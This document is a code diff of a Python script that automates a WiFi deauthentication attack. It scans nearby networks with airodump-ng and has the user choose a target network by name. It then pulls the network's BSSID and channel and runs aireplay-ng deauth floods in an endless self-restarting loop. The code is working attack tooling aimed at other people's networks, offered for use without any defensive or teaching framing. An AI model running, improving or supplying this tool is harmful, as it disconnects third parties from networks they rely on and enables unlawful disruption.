@@ -1,4 +1,4 @@
-import subprocess, time, sys, argparse, inquirer, re
+import subprocess, time, sys, argparse, inquirer, re, random, string, os
 
 
 
@@ -6,7 +6,7 @@ import subprocess, time, sys, argparse, inquirer, re
 
 
 
-
+project = {}
 
 red = "\033[1;31m"
 
@@ -16,6 +16,19 @@ yellow = "\033[1;33m"
 
 blue = "\033[1;34m"
 
+run = lambda cmd : subprocess.run( cmd, shell = True, check = True )
+
+dream = lambda TIME : time.sleep( TIME )
+
+uniqueName = lambda : f"DeAuPs-{ ''.join( random.choice( string.ascii_uppercase + string.ascii_lowercase + string.digits + '-_' ) for x in range( int( 5 ) ) ) }"
+
+deleteDir = lambda : run( f"rm -rf ./{ project[ 'dirName' ] }" )
+
+targetName = lambda nameOptionsList : inquirer.prompt( [ inquirer.List( "option", message = "Choose a wifi name", choices = nameOptionsList ) ] )[ "option" ]
+
+nameOptions = lambda : [ x.strip() for x in [ [ x.strip() for x in open( f"./{ project[ 'dirName' ] }/wifiNames.py", "r" ).readlines() ] ][ 0 ] if x.strip() != "" ]
+
+collectWifiNames = lambda : run( "sudo awk -F',' '{ if ($1 ~ /Station/ || $1 ~ /BSSID/) next; print $14 }' ./%s/captureFile-02.csv | sort -u > ./%s/wifiNames.py" % ( project[ "dirName" ], project[ "dirName" ] ) )
 
 
 
@@ -24,21 +37,8 @@ blue = "\033[1;34m"
 
 
 
-def deleteF():
 
-    cmd = "sudo rm -rf ./wifi_-rble1-_DeAuPs/wifiInterFceCsv-02.csv ./wifi_-rble1-_DeAuPs/wifiInterFceCsv-01.csv ./wifi_-rble1-_DeAuPs/cltNmeCsv.py ./wifi_-rble1-_DeAuPs/wifiBssid.py ./wifi_-rble1-_DeAuPs/wifiChannel.py ./wifi_-rble1-_DeAuPs/wifiInterF.txt ./wifi_-rble1-_DeAuPs/essidColt.py ./wifi_-rble1-_DeAuPs/wifiChnelSts.py"
-
-    subprocess.run( cmd, shell = True, check = True )
-
-
-
-
-
-
-
-
-
-def downLine( t = 12 ):
+def waiting( t = 12 ):
 
     sTime = time.time()
 
@@ -50,7 +50,13 @@ def downLine( t = 12 ):
 
         p = eTime / t
 
-        line = f"\r{ green }Program is fishing 🎣: { '-' * int( length * p ):{ length }s} { int( p * 101 ) }%"
+        if t == 12:
+
+            line = f"\r{ green }Capturing wireless networks and informations: { '-' * int( length * p ):{ length }s} { int( p * 101 ) }%"
+
+        else:
+
+            line = f"\r{ green }{ int( p * 102 ) }%"
 
         sys.stdout.write( line )
 
@@ -66,281 +72,245 @@ def downLine( t = 12 ):
 
 
 
-def iwCh( channel, interface ):
+def startDeAuth():
+
+    file = open( f"./{ project[ 'dirName' ] }/deauthErrorReader.py", "w" )
+
+    print( f"\n\n{ yellow }Attacking { project[ 'name' ] }" )
+
+    process = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", project[ "bssid" ], project[ "interface" ] ], stdout = file, stderr = subprocess.PIPE )
+
+    dream( 25 )
+
+    process.terminate()
+
+    process.wait()
 
     try:
 
-        cmd = f"sudo iwconfig { interface } channel { channel }"
+        file1 = open( f"./{ project[ 'dirName' ] }/deauthErrorReader.py", "r" )
 
-        subprocess.run( cmd, shell = True, check = True )
+        text1 = file1.read().strip()
 
-    except:
+        searching1 = re.findall( r"but the AP uses channel (\S+)", text1, re.IGNORECASE )
 
-        print( f"\n\n{ red }Getting error in setting channel on { interface }!\nLet him fish again!\n\n" )
+        if len( searching1 ) == 0:
 
-        deleteF()
-
-        sys.exit( 0 )
-
-
-
-
-
-
-
-
-
-def kiddDeAuth( BSSID, interface, ESSID ):
-
-    try:
-
-        print( f"\n\n{ red }Program is roasting the { ESSID } fish!\n\n" )
-
-        chkErrF = open( "./wifi_-rble1-_DeAuPs/wifiChnelSts.py", "w" )
-
-        cmd = [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ]
-
-        p = subprocess.Popen( cmd, stdout = chkErrF, stderr = subprocess.PIPE )
-
-        time.sleep( 25 )
-
-        p.terminate()
-
-        p.wait()
-
-        time.sleep( 1 )
-
-        try:
-
-            radChkErrF = open( "./wifi_-rble1-_DeAuPs/wifiChnelSts.py", "r" )
-
-            txt = radChkErrF.read().strip()
-
-            try:
-
-                ap = re.findall( r"but the AP uses channel (\S+)", txt, re.IGNORECASE )[ 0 ]
-
-                AP = ap.strip()
-
-                if type( int( AP ) ) == int or AP:
-
-                    iwCh( AP, interface )
-
-                time.sleep( 1 )
-
-                print( f"\n\n{ yellow }Program caught and reset the changed channel.\n\n" )
-
-            except:
-
-                print( f"\n\n{ green }Channel is set correctly\n\n" )
-
-            try:
-
-                noBssid = re.findall( r"No such BSSID available", txt, re.IGNORECASE )[ 0 ]
-
-                if noBssid.lower() == "no such bssid available" or noBssid:
-
-                    print( f"\n\n{ yellow }No BSSID caution is appearing!\n\n" )
-
-                    air( interface, ESSID )
-
-            except:
-
-                print( f"\n\n{ green }BSSID is available\n\n" )
-
-        except:
-
-            print( f"\n\n{ yellow }wifiChnelSts file is missing!\n\n" )
-
-        print( f"\n\n{ green }Taking a nap 💤\n\n" )
-
-        time.sleep( 60 )
-
-        kiddDeAuth( BSSID, interface, ESSID )
-
-    except:
-
-        deleteF()
-
-        print( f"\n{ red }Stop sending DeAuth and files created by this script have been deleted!\n" )
-
-        sys.exit( 0 )
-
-
-
-
-
-
-
-
-
-def air( IF, rstEssid = None ):
-
-    clrCmd = "sudo clear"
-
-    subprocess.run( clrCmd, shell = True, check = True )
-
-    delMkDirCmd = "rm -rf wifi_-rble1-_DeAuPs"
-
-    subprocess.run( delMkDirCmd, shell = True, check = True )
-
-    mkDirCmd = "sudo mkdir wifi_-rble1-_DeAuPs"
-
-    subprocess.run( mkDirCmd, shell = True, check = True )
-
-    time.sleep( 0.2 )
-
-    lst = []
-
-    csvLst = []
-
-    rmLst = [ "AUTH", "ESSID", "PSK", "OPN", "0>" ]
-
-    dic = {}
-
-    fTxt = open( "./wifi_-rble1-_DeAuPs/wifiInterF.txt", "w" )
-
-    fCsv = open( "./wifi_-rble1-_DeAuPs/wifiInterFceCsv-01.csv", "w" )
-
-    cmd = [ "sudo", "airodump-ng", "-i", IF ]
-
-    esidCsvCmd = [ "sudo", "airodump-ng", "-w", "./wifi_-rble1-_DeAuPs/wifiInterFceCsv", "--output-format", "csv", IF ]
-
-    p = subprocess.Popen( cmd, stdout = fTxt )
-
-    csvPrcs = subprocess.Popen( esidCsvCmd, stdout = fCsv )
-
-    downLine()
-
-    p.terminate()
-
-    csvPrcs.terminate()
-
-    p.wait()
-
-    csvPrcs.wait()
-
-    if rstEssid == None:
-
-        essidCmd = "sudo awk '{print $11, $12, $13, $14, $15, $16, $17, $18, $19 $20}' ./wifi_-rble1-_DeAuPs/wifiInterF.txt | sort -u > ./wifi_-rble1-_DeAuPs/essidColt.py"
-
-        subprocess.run( essidCmd, shell = True, check = True )
-
-        time.sleep( 0.2 )
-
-        with open( "./wifi_-rble1-_DeAuPs/essidColt.py", "r" ) as f:
-
-            for readL in f:
-
-                mdWrd = readL.strip()
-
-                for y in rmLst:
-
-                    mdWrd = mdWrd.replace( y, "" )
-
-                lst.append( mdWrd.strip() )
-
-        clnData = [ re.sub( r"\x1b\[.*?K", "", x ) for x in lst ]
-
-        clnData1 = [ x.strip() for x in clnData if x.strip() != "" ]
-
-        resultLst = set( clnData1 )
-
-        cltCsvCmd = "sudo awk -F',' '{if ($1 ~ /Station/ || $1 ~ /BSSID/) next; print $14}' ./wifi_-rble1-_DeAuPs/wifiInterFceCsv-02.csv | sort -u > ./wifi_-rble1-_DeAuPs/cltNmeCsv.py"
-
-        subprocess.run( cltCsvCmd, shell = True, check = True )
-
-        radCsvF = open( "./wifi_-rble1-_DeAuPs/cltNmeCsv.py", "r" )
-
-        while radCsvF.readline():
-
-            csvLst.append( radCsvF.read().strip() )
-
-        nameStr = " ".join( csvLst )
-
-        vldNme = nameStr.split( "\n" )
-
-        esidNme = [ x.strip() for x in vldNme if x.strip() ]
-
-        essidName = set( esidNme )
-
-        existEsid = list( resultLst.intersection( essidName ) )
-
-        if len( existEsid ) != 0:
-
-            realEssid = list( essidName )
-
-            tile = f"Choose a fish name in { len( realEssid ) }"
-
-            wihOne = [ inquirer.List( "opt", message = tile, choices = realEssid ) ]
-
-            wifiName = inquirer.prompt( wihOne )[ "opt" ]
-
-            dic[ "fishName" ] = wifiName
-
-            dic[ "ESSID" ] = wifiName.lower()
+            print( f"{ green }Access point uses the right channel." )
 
         else:
 
-            air( IF )
+            print( f"\n{ red }Channel reconfiguration to { searching1[ 0 ] }\n" )
+
+            project[ "channel" ] = searching1[ 0 ]
+
+            configChannel()
+
+        file2 = open( f"./{ project[ 'dirName' ] }/deauthErrorReader.py", "r" )
+
+        text2 = file2.read().strip()
+
+        searching2 = re.findall( r"No such BSSID available", text2, re.IGNORECASE )
+
+        if len( searching2 ) == 0:
+
+            print( f"{ green }The BSSID found." )
+
+        else:
+
+            print( f"\n{ red }Channel is missing. The wifi may be turned off!\n" )
+
+            deleteDir()
+
+            dream( 2 )
+
+            start( restart = True )
+
+    except:
+
+        deleteDir()
+
+        dream( 2 )
+
+        start( restart = True )
+
+    waiting( 6 )
+
+    startDeAuth()
+
+
+
+
+
+
+
+
+
+def configChannel():
+
+    try:
+
+        run( f"sudo iwconfig { project[ 'interface' ] } channel { project[ 'channel' ] }" )
+
+    except:
+
+        print( f"{ yellow }The wifi may be turned off!" )
+
+        deleteDir()
+
+        dream( 2 )
+
+        start( restart = True )
+
+
+
+
+
+
+
+
+
+def getTargetChannel():
+
+    run( "sudo grep -i '%s' ./%s/captureFile-02.csv | awk -F ',' '{ print $4 }' > ./%s/targetChannel.py" % ( project[ "name" ], project[ "dirName" ], project[ "dirName" ] ) )
+
+    dream( 0.2 )
+
+    try:
+
+        file = open( f"./{ project[ 'dirName' ] }/targetChannel.py", "r" )
+
+        return( file.read().strip() )
+
+    except:
+
+        deleteDir()
+
+        dream( 2 )
+
+        start( restart = True )
+
+
+
+
+
+
+
+
+
+def getTargetBssid():
+
+    run( "sudo grep -i '%s' ./%s/captureFile-02.csv | awk -F ',' '{ print $1 }' > ./%s/targetBssid.py" % ( project[ "name" ], project[ "dirName" ], project[ "dirName" ] ) )
+
+    dream( 0.2 )
+
+    try:
+
+        file = open( f"./{ project[ 'dirName' ] }/targetBssid.py", "r" )
+
+        return( file.read().strip() )
+
+    except:
+
+        deleteDir()
+
+        dream( 2 )
+
+        start( restart = True )
+
+
+
+
+
+
+
+
+
+def createCaptureFiles():
+
+    file = open( f"./{ project[ 'dirName' ] }/captureFile-01.csv", "w" )
+
+    process = subprocess.Popen( [ "sudo", "airodump-ng", "-w", f"./{ project[ 'dirName' ] }/captureFile", "--output-format", "csv", project[ "interface" ] ], stdout = file )
+
+    waiting()
+
+    process.terminate()
+
+    process.wait()
+
+
+
+
+
+
+
+
+
+def createDir():
+
+    dirName = uniqueName()
+
+    if os.path.exists( dirName ):
+
+        createDir()
+
+    run( f"sudo mkdir ./{ dirName }" )
+
+    if os.path.exists( dirName ):
+
+        project[ "dirName" ] = dirName
 
     else:
 
-        dic[ "ESSID" ] = rstEssid.lower()
+        createDir()
 
-        dic[ "fishName" ] = rstEssid
 
-    ESSID = dic[ "ESSID" ]
 
-    cmd1 = "sudo grep -i '%s' ./wifi_-rble1-_DeAuPs/wifiInterF.txt | head -n 1 | awk '{ print $2 }' > ./wifi_-rble1-_DeAuPs/wifiBssid.py" % ESSID
 
-    cmd2 = "sudo grep -i '%s' ./wifi_-rble1-_DeAuPs/wifiInterF.txt | head -n 1 | awk '{ print $7 }' > ./wifi_-rble1-_DeAuPs/wifiChannel.py" % ESSID
 
-    subprocess.run( cmd1, shell = True, check = True )
 
-    time.sleep( 0.2 )
 
-    subprocess.run( cmd2, shell = True, check = True )
 
-    time.sleep( 0.2 )
+
+def start( restart = False ):
 
     try:
 
-        bFile = open( "./wifi_-rble1-_DeAuPs/wifiBssid.py", "r" )
+        if restart == True:
 
-        cFile = open( "./wifi_-rble1-_DeAuPs/wifiChannel.py", "r" )
+            createDir()
 
-        bssid = bFile.read().strip()
+            createCaptureFiles()
 
-        chnel = cFile.read().strip()
+            collectWifiNames()
 
-        if bssid == "" or chnel == "":
-
-            print( f"\n\n{ yellow }1. Run the script in a full-screen terminal\n\n2. Ensure your IF is in monitor mode.\n\n" )
-
-            sys.exit( 0 )
+            project[ "channel" ] = getTargetChannel()
 
         else:
 
-            bigFishName = dic[ "fishName" ]
+            createDir()
 
-            print( f"\n\n\n{ green }🐟 { bigFishName } fish on!\n\n" )
+            createCaptureFiles()
 
-            dic[ "bssid" ] = bssid
+            collectWifiNames()
 
-            dic[ "channel" ] = chnel
+            project[ "name" ] = targetName( nameOptions() )
+
+            project[ "bssid" ] = getTargetBssid()
+
+            project[ "channel" ] = getTargetChannel()
+
+        configChannel()
+
+        startDeAuth()
 
     except:
 
-        print( f"\n\n{ red }wifiBssid or wifiChannel files are not found!\n\n" )
+        deleteDir()
 
-        deleteF()
+        dream( 2 )
 
-        sys.exit( 0 )
-
-    iwCh( dic[ "channel" ], IF )
-
-    kiddDeAuth( dic[ "bssid" ], IF, dic[ "fishName" ] )
+        start( restart = True )
 
 
 
@@ -352,13 +322,17 @@ def air( IF, rstEssid = None ):
 
 def main():
 
-    creOpt = argparse.ArgumentParser( description = "How to use?" )
+    createOption = argparse.ArgumentParser( description = "How to use?" )
 
-    creOpt.add_argument( "-i", "--interface", type = str, required = True, help = "Network interface" )
+    createOption.add_argument( "-i", "--interface", type = str, required = True, help = "Network interface" )
 
-    opt = creOpt.parse_args()
+    option = createOption.parse_args()
 
-    air( opt.interface )
+    project[ "interface" ] = option.interface
+
+    run( "sudo clear" )
+
+    start()
 
 
 
